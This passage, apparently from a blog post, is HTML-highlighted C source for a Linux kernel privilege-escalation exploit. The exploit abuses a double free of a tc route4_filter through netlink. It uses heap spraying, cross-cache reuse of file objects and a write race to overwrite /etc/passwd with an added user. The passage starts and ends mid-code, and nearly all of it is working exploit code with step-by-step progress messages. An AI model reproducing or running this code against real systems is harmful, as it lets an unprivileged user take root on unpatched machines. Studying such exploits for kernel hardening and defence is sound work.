<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// slow_write() —— thread 1: occupy the write lock (write plenty of data)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">        <span class="keyword">void</span>* r = mmap((<span class="keyword">void</span>*)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mem = (<span class="keyword">void</span>*)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">    start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() —— thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = content, .iov_len = <span class="built_in">strlen</span>(content) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">            <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">            old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">    <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line">    <span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="comment">// sleep(10000);</span></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line">            <span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line">                <span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line">                <span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">                close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">                close(overlap_b);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 13. finish exploitation</span></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write) &#123; sleep(<span class="number">1</span>); &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 0. initialize pipe as notifier</span></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)   <span class="comment">// begin spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)   <span class="comment">// end spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// spray 4096 `file` (sub-process)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);  <span class="comment">// write pipe_file_spray[1] —— finish spray `file`</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0. preprocess &amp; start main exploit</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();  <span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line">        exploit();      <span class="comment">// main exploit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. defragmentation —— spray 10000 `file` to exhaust all file slabs for cross cache - all cores</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross cache\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed write defrag&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 2. spray thread - core 0         spray kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line">            <span class="comment">// 2-1. prepare payload</span></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line">      <span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//getchar();</span></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">        MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] self path %s\n&quot;</span>, self_path);</span><br><span class="line">    <span class="comment">// prepare write data —— evil data + existing data in /etc/passwd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare evil data\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span>*)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="comment">// run_exp() in sub-process</span></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        run_exp();                  <span class="comment">// main exploit</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// judge if succeed</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] succeed\n&quot;</span>);</span><br><span class="line">    